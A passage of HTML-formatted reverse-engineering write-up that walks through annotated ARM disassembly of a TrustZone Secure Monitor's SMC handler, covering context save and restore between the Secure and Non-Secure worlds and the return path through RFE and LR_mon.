&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1B8&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;S_core_context&lt;/span&gt; &lt;span class="c1"&gt;; secure area where previous Secure context is stored&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1BC&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SP&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1C0&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_IRQ ; switch to IRQ mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1C4&lt;/span&gt;                 &lt;span class="no"&gt;LDMIA&lt;/span&gt;           &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1C8&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;SPSR_cxsf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R12&lt;/span&gt; &lt;span class="c1"&gt;; write SPSR_irq&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1CC&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_SVC ; switch to Supervisor mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1D0&lt;/span&gt;                 &lt;span class="no"&gt;LDMIA&lt;/span&gt;           &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1D4&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;SPSR_cxsf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R12&lt;/span&gt; &lt;span class="c1"&gt;; write SPSR_svc&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1D8&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_ABT ; switch to Abort mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1DC&lt;/span&gt;                 &lt;span class="no"&gt;LDMIA&lt;/span&gt;           &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1E0&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;SPSR_cxsf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R12&lt;/span&gt; &lt;span class="c1"&gt;; write SPSR_abt&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1E4&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_UND ; switch to Undefined mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1E8&lt;/span&gt;                 &lt;span class="no"&gt;LDMIA&lt;/span&gt;           &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1EC&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;SPSR_cxsf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R12&lt;/span&gt; &lt;span class="c1"&gt;; write SPSR_und&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1F0&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_FIQ ; switch to FIQ mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1F4&lt;/span&gt;                 &lt;span class="no"&gt;LDMIA&lt;/span&gt;           &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R7-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1F8&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;SPSR_cxsf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R7&lt;/span&gt; &lt;span class="c1"&gt;; write SPSR_fiq&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1FC&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_MON ; switch back to Monitor mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D200&lt;/span&gt;                 &lt;span class="no"&gt;LDMEA&lt;/span&gt;           &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R0-LR&lt;/span&gt;&lt;span class="err"&gt;}^&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h5&gt;IV.3.A.f Exception return to Secure world&lt;/h5&gt;

&lt;p&gt;Finally, the Monitor stack address is restored, and a Return From
Exception (RFE) instruction loads the LR and the CPSR of
interrupted Secure World from a specific address in Secure
memory.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D204&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;LR&lt;/span&gt;  &lt;span class="c1"&gt;; restore Monitor stack address&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D208&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;LR&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;S_core_status&lt;/span&gt; &lt;span class="c1"&gt;; ptr to previously-saved Secure LR &amp;amp; CPSR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D20C&lt;/span&gt;                 &lt;span class="no"&gt;RFEIA&lt;/span&gt;           &lt;span class="no"&gt;LR&lt;/span&gt;      &lt;span class="c1"&gt;; Return From Exception to Secure World&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;IV.3.B Return to Non-Secure World&lt;/h3&gt;

&lt;p&gt;In the case where SCR.NS is not set, the Secure world returns
results to calling function in Non-Secure world.&lt;/p&gt;
&lt;p&gt;A lot of operations here are similar to those previously described
in the "Call to Secure World" section.&lt;/p&gt;
&lt;h5&gt;IV.3.B.a Pre-exception status&lt;/h5&gt;

&lt;p&gt;First, LR_mon &amp;amp; SPSR_mon registers are saved in Secure memory to be
restored next time the TrustZone is entered. LR_mon contains the
return address in Secure world (right after the SMC instruction).
The purpose of SPSR_mon is to record the pre-exception value of the
CPSR.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D210&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;S_core_status&lt;/span&gt; &lt;span class="c1"&gt;; secure area to store Secure status&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D214&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;LR&lt;/span&gt;  &lt;span class="c1"&gt;; read Secure return address (LR_mon)&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D218&lt;/span&gt;                 &lt;span class="no"&gt;MRS&lt;/span&gt;             &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SPSR&lt;/span&gt; &lt;span class="c1"&gt;; read Secure CPSR (SPSR_mon)&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D21C&lt;/span&gt;                 &lt;span class="no"&gt;STMIA&lt;/span&gt;           &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt; &lt;span class="c1"&gt;; write LR_mon &amp;amp; SPSR_mon&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h5&gt;IV.3.B.b Context switching&lt;/h5&gt;

&lt;p&gt;Then, the Secure World context is saved, and the Normal World
context is restored from a previous context switch (Normal to
Secure World).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D224&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;LR&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SP&lt;/span&gt;  &lt;span class="c1"&gt;; save Monitor stack address&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D228&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;S_core_context&lt;/span&gt; &lt;span class="c1"&gt;; secure area to store Secure context&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D22C&lt;/span&gt;                 &lt;span class="no"&gt;STMFD&lt;/span&gt;           &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R0-LR&lt;/span&gt;&lt;span class="err"&gt;}^&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D230&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SP&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D234&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_IRQ ; switch to IRQ mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D238&lt;/span&gt;                 &lt;span class="no"&gt;MRS&lt;/span&gt;             &lt;span class="no"&gt;R12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SPSR&lt;/span&gt; &lt;span class="c1"&gt;; read SPSR_irq&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D23C&lt;/span&gt;                 &lt;span class="no"&gt;STMIA&lt;/span&gt;           &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D240&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_SVC ; switch to Supervisor mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D244&lt;/span&gt;                 &lt;span class="no"&gt;MRS&lt;/span&gt;             &lt;span class="no"&gt;R12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SPSR&lt;/span&gt; &lt;span class="c1"&gt;; read SPSR_svc&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D248&lt;/span&gt;                 &lt;span class="no"&gt;STMIA&lt;/span&gt;           &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D24C&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_ABT ; switch to Abort mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D250&lt;/span&gt;                 &lt;span class="no"&gt;MRS&lt;/span&gt;             &lt;span class="no"&gt;R12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SPSR&lt;/span&gt; &lt;span class="c1"&gt;; read SPSR_abt&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D254&lt;/span&gt;                 &lt;span class="no"&gt;STMIA&lt;/span&gt;           &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D258&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_UND ; switch to Undefined mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D25C&lt;/span&gt;                 &lt;span class="no"&gt;MRS&lt;/span&gt;             &lt;span class="no"&gt;R12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SPSR&lt;/span&gt; &lt;span class="c1"&gt;; read SPSR_und&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D260&lt;/span&gt;                 &lt;span class="no"&gt;STMIA&lt;/span&gt;           &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D264&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_FIQ ; switch to FIQ mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D268&lt;/span&gt;                 &lt;span class="no"&gt;MRS&lt;/span&gt;             &lt;span class="no"&gt;R7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SPSR&lt;/span&gt; &lt;span class="c1"&gt;; read SPSR_fiq&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D26C&lt;/span&gt;                 &lt;span class="no"&gt;STMIA&lt;/span&gt;           &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R7-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D270&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_MON ; switch back to Monitor mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D274&lt;/span&gt;                 &lt;span class="no"&gt;SUB&lt;/span&gt;             &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x94 ; NS_core_context = SP (S_core_context) - 0x94&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D278&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SP&lt;/span&gt;  &lt;span class="c1"&gt;; secure area where previous Non-Secure context is stored&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D27C&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_IRQ ; switch to IRQ mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D280&lt;/span&gt;                 &lt;span class="no"&gt;LDMIA&lt;/span&gt;           &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D284&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;SPSR_cxsf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R12&lt;/span&gt; &lt;span class="c1"&gt;; write SPSR_irq&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D288&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_SVC ; switch to Supervisor mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D28C&lt;/span&gt;                 &lt;span class="no"&gt;LDMIA&lt;/span&gt;           &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D290&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;SPSR_cxsf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R12&lt;/span&gt; &lt;span class="c1"&gt;; write SPSR_svc&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D294&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_ABT ; switch to Abort mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D298&lt;/span&gt;                 &lt;span class="no"&gt;LDMIA&lt;/span&gt;           &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D29C&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;SPSR_cxsf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R12&lt;/span&gt; &lt;span class="c1"&gt;; write SPSR_abt&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2A0&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_UND ; switch to Undefined mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2A4&lt;/span&gt;                 &lt;span class="no"&gt;LDMIA&lt;/span&gt;           &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2A8&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;SPSR_cxsf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R12&lt;/span&gt; &lt;span class="c1"&gt;; write SPSR_und&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2AC&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_FIQ ; switch to FIQ mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2B0&lt;/span&gt;                 &lt;span class="no"&gt;LDMIA&lt;/span&gt;           &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R7-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2B4&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;SPSR_cxsf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R7&lt;/span&gt; &lt;span class="c1"&gt;; write SPSR_fiq&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2B8&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_MON ; switch back to Monitor mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2BC&lt;/span&gt;                 &lt;span class="no"&gt;LDMEA&lt;/span&gt;           &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R0-LR&lt;/span&gt;&lt;span class="err"&gt;}^&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2C0&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;LR&lt;/span&gt;  &lt;span class="c1"&gt;; restore Monitor stack address&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h5&gt;IV.3.B.c IRQ interrupt flag&lt;/h5&gt;

&lt;p&gt;Next instructions check the DWORD value which indicates that an IRQ
interrupt occurred. If this flag is set, the return value is set to
1 in R0.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2C4&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;tz_irq_interrupted&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2C8&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2CC&lt;/span&gt;                 &lt;span class="no"&gt;CMP&lt;/span&gt;             &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0  ; if an IRQ interrupt occurred&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2D0&lt;/span&gt;                 &lt;span class="no"&gt;MOVNE&lt;/span&gt;           &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#1  ; then set return value to 1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This may seem pointless in the context of the SMC handler. But
actually this part of code is also used by the IRQ handler to
return to the Normal World.&lt;/p&gt;
&lt;h5&gt;IV.3.B.d Non-secure CPSR &amp; LR&lt;/h5&gt;

&lt;p&gt;Then CPSR and LR from previously interrupted Non-Secure state are
written to SPSR_mon and LR_mon.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2D4&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;LR&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;NS_core_status&lt;/span&gt; &lt;span class="c1"&gt;; ptr to previously-saved Non-Secure LR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2D8&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;LR&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;LR&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;; restore Non-Secure return address&lt;/span&gt;
